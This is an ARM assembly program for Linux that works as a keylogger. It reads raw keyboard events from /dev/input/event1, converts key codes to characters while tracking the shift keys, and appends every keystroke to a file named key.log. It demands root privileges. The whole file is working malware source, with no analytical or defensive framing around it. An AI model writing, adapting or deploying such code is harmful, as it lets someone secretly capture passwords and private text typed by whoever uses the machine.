        .global _start

        .text

_start:
        // open destination file
        MOV   R7, #5                     // open syscall
        LDR   R0, =dest
        LDR   R1, =02101                 // O_WRONLY | O_CREAT | O_APPEND
        MOV   R2, #00644                 // S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
        SVC   #0
        MOV   R11, R0                    // save returned file handler

        // open source file
        MOV   R7, #5                     // open syscall
        LDR   R0, =source
        MOV   R1, #0                     // O_RDONLY
        SVC   #0
        MOV   R12, R0                    // save returned file handler

        // check root privileges for reading source file
        LDR   R1, =0xFFFFFFF3            // error code for not being root
        CMP   R0, R1
        BEQ   error

loop:
        // get next input_event
        MOV   R7, #3                     // read syscall
        MOV   R0, R12                    // source file handler
        LDR   R1, =input_event
        MOV   R2, #16                    // get single input_event (16 bytes)
        SVC   #0

        // save input_event.type
        LDR   R0, =input_event
        LDRH  R0, [R0, #8]

        // skip if input_event.type == 0
        CMP   R0, #0
        BEQ   loop

        // skip if input_event.type == 4
        CMP   R0, #4
        BEQ   loop

        // save input_event.value
        LDR   R0, =input_event
        LDR   R0, [R0, #12]

        // skip if input_event.value == 0 (release)
        CMP   R0, #0
        BEQ   checkShiftRelease
        B     skipShiftReleaseCheck

checkShiftRelease:
        LDR   R0, =input_event
        LDRH  R0, [R0, #10]

        CMP   R0, #42
        BEQ   releaseShift

        CMP   R0, #54
        BEQ   releaseShift
        B     loop

releaseShift:
        LDR   R9, =shift
        MOV   R8, #0
        STRB  R8, [R9]
        B     loop

skipShiftReleaseCheck:
        // save input_event.code (key)
        LDR   R0, =input_event
        LDRH  R0, [R0, #10]

        // check if key is a shift
        CMP   R0, #42                    // left shift key
        BEQ   setShift

        CMP   R0, #54                    // right shift key
        BEQ   setShift
        B     checkShiftSet

setShift:
        // set shift flag to 1
        LDR   R9, =shift
        MOV   R8, #1
        STRB  R8, [R9]
        B     loop

checkShiftSet:
        // use shift flag to determine which case to use
        LDR   R9, =shift
        LDRB  R8, [R9]
        CMP   R8, #0
        BEQ   lower

upper:
        // shift flag was set to 1
        LDR   R1, =uppercase
        LDR   R0, [R1, R0]
        B     write

lower:
        // shift flag was set to 0
        LDR   R1, =lowercase
        LDR   R0, [R1, R0]

write:
        // save ascii code for current character
        AND   R0, R0, #0xFF
        MOV   R10, R0
        LDR   R9, =character
        STRB  R10, [R9]

        // write character to destination file
        MOV   R7, #4
        MOV   R0, R11
        LDR   R1, =character
        MOV   R2, #1
        SVC   #0

        // get next character
        B     loop

_end:
        // for clean exit
        MOV   R7, #1
        SVC   #0

error:
        // print error message to stdout
        MOV   R7, #4
        MOV   R0, #2
        LDR   R1, =errMsg
        LDR   R2, =lenErrMsg
        SVC   #0
        B     _end

        .data

dest:   .asciz "key.log"
source: .asciz "/dev/input/event1"

errMsg: .asciz "Error: Program must be ran as root.\n"
        .equ   lenErrMsg, (.-errMsg)

lowercase:
        .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./?*? ?????????????"
        .ascii "789-456+1230.????????????\n?/??????????????????????????????????????????????"
uppercase:
        .ascii "??!@#$%^&*()_+??QWERTYUIOP{}\n?ASDFGHJKL:\"~?|ZXCVBNM<>???? ???????????????"

input_event:
        .fill 16, 1, 0
character:
        .byte 0
shift:  .byte 0
